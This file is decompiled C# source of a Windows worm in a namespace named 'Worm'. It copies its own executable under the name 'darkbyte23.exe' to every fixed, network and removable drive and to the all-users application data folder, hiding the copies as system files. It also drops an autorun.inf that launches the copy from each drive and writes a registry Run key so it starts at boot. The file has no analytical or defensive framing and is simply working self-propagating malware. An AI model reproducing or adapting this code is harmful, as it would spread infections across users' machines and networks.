using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Worm.My;

namespace Worm;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		string text = default(string);
		int num2 = default(int);
		int num3 = default(int);
		object objectValue = default(object);
		string contents = default(string);
		int num5 = default(int);
		int num6 = default(int);
		int driveType = default(int);
		byte[] bytes = default(byte[]);
		int num7 = default(int);
		string text2 = default(string);
		int fileAttributes = default(int);
		string path = default(string);
		int num8 = default(int);
		int driveType2 = default(int);
		object objectValue2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					object obj;
					object[] array;
					object[] array2;
					bool[] array3;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						text = "";
						goto IL_000a;
					case 1297:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_001b;
							case 5:
								goto IL_003f;
							case 8:
							case 9:
								goto IL_007d;
							case 6:
								goto IL_0089;
							case 7:
							case 10:
								goto IL_00a8;
							case 11:
								goto IL_00b8;
							case 12:
								goto IL_00dc;
							case 13:
								goto IL_00f6;
							case 15:
								goto IL_0106;
							case 16:
								goto IL_010a;
							case 17:
								goto IL_011a;
							case 18:
								goto IL_0127;
							case 22:
								goto IL_0141;
							case 23:
								goto IL_01d3;
							case 24:
								goto IL_01f9;
							case 25:
								goto IL_01ff;
							case 26:
								goto IL_0211;
							case 27:
								goto IL_021c;
							case 28:
								goto IL_0229;
							case 29:
								goto IL_0235;
							case 30:
								goto IL_024f;
							case 31:
								goto IL_0264;
							case 32:
							case 33:
								goto IL_027a;
							case 34:
								goto IL_0289;
							case 35:
								goto IL_02ae;
							case 38:
							case 39:
								goto IL_02ed;
							case 36:
								goto IL_02f9;
							case 37:
							case 40:
								goto IL_0319;
							case 14:
							case 19:
							case 20:
							case 21:
								goto IL_0323;
							case 41:
								goto IL_0347;
							case 42:
								goto IL_0361;
							case 43:
								goto IL_03cc;
							case 44:
								goto IL_03e6;
							case 45:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 46:
							case 47:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_03cc:
						num = 43;
						objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Wscript.shell", ""));
						goto IL_03e6;
						IL_000a:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0012;
						IL_0012:
						num = 3;
						contents = "[AutoRun]\r\nshellexecute=darkbyte23.exe";
						goto IL_001b;
						IL_001b:
						num = 4;
						num5 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().Count - 1;
						num6 = 0;
						goto IL_0039;
						IL_0039:
						if (num6 <= num5)
						{
							goto IL_003f;
						}
						goto IL_00a8;
						IL_003f:
						num = 5;
						if (Operators.CompareString(((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].Name, Strings.Left(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), 3), false) != 0)
						{
							goto IL_007d;
						}
						goto IL_0089;
						IL_0089:
						num = 6;
						driveType = unchecked((int)((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].DriveType);
						goto IL_00a8;
						IL_007d:
						num = 9;
						num6++;
						goto IL_0039;
						IL_00a8:
						num = 10;
						bytes = File.ReadAllBytes(Application.get_ExecutablePath());
						goto IL_00b8;
						IL_00b8:
						num = 11;
						text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_AllUsersApplicationData() + "\\darkbyte23.exe";
						goto IL_00dc;
						IL_00dc:
						num = 12;
						if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)0), "", false) != 0)
						{
							goto IL_00f6;
						}
						goto IL_0106;
						IL_00f6:
						num = 13;
						File.Delete(text);
						goto IL_0323;
						IL_0106:
						num = 15;
						goto IL_010a;
						IL_010a:
						num = 16;
						File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Normal);
						goto IL_011a;
						IL_011a:
						num = 17;
						File.WriteAllBytes(text, bytes);
						goto IL_0127;
						IL_0127:
						num = 18;
						File.SetAttributes(text, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
						goto IL_0323;
						IL_0323:
						num = 21;
						num7 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().Count - 1;
						num6 = 0;
						goto IL_0138;
						IL_0138:
						if (num6 <= num7)
						{
							goto IL_0141;
						}
						goto IL_0289;
						IL_0141:
						num = 22;
						if ((((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].DriveType == DriveType.Network) | (((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].DriveType == DriveType.Fixed) | ((((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].DriveType == DriveType.Removable) & (Operators.CompareString(((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].Name, "A:\\", false) != 0)))
						{
							goto IL_01d3;
						}
						goto IL_027a;
						IL_01d3:
						num = 23;
						text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].RootDirectory.ToString();
						goto IL_01f9;
						IL_01f9:
						num = 24;
						fileAttributes = 7;
						goto IL_01ff;
						IL_01ff:
						num = 25;
						path = text2 + "darkbyte23.exe";
						goto IL_0211;
						IL_0211:
						num = 26;
						File.Delete(path);
						goto IL_021c;
						IL_021c:
						num = 27;
						File.WriteAllBytes(path, bytes);
						goto IL_0229;
						IL_0229:
						num = 28;
						File.SetAttributes(path, unchecked((FileAttributes)fileAttributes));
						goto IL_0235;
						IL_0235:
						num = 29;
						File.SetAttributes(text2 + "autorun.inf", FileAttributes.Hidden | FileAttributes.System | FileAttributes.Normal);
						goto IL_024f;
						IL_024f:
						num = 30;
						File.Delete(text2 + "autorun.inf");
						goto IL_0264;
						IL_0264:
						num = 31;
						File.WriteAllText(text2 + "autorun.inf", contents);
						goto IL_027a;
						IL_027a:
						num = 33;
						num6++;
						goto IL_0138;
						IL_0289:
						num = 34;
						num8 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().Count - 1;
						num6 = 0;
						goto IL_02a8;
						IL_02a8:
						if (num6 <= num8)
						{
							goto IL_02ae;
						}
						goto IL_0319;
						IL_02ae:
						num = 35;
						if (Operators.CompareString(((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].Name, Strings.Left(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), 3), false) != 0)
						{
							goto IL_02ed;
						}
						goto IL_02f9;
						IL_02f9:
						num = 36;
						driveType2 = unchecked((int)((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[num6].DriveType);
						goto IL_0319;
						IL_02ed:
						num = 39;
						num6++;
						goto IL_02a8;
						IL_0319:
						num = 40;
						if (driveType != driveType2)
						{
							goto IL_0323;
						}
						goto IL_0347;
						IL_0347:
						num = 41;
						objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
						goto IL_0361;
						IL_0361:
						num = 42;
						obj = objectValue2;
						array = new object[2] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\darkbyte23", text };
						array2 = array;
						array3 = new bool[2] { false, true };
						NewLateBinding.LateCall(obj, (Type)null, "regwrite", array2, (string[])null, (Type[])null, array3, true);
						if (array3[1])
						{
							text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
						}
						goto IL_03cc;
						IL_03e6:
						num = 44;
						if (Strings.Len(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath()) >= 4)
						{
							goto end_IL_0000_3;
						}
						break;
						end_IL_0000_2:
						break;
					}
					num = 45;
					NewLateBinding.LateCall(objectValue, (Type)null, "run", new object[1] { "explorer.exe /s, " + ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				}
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 1297;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
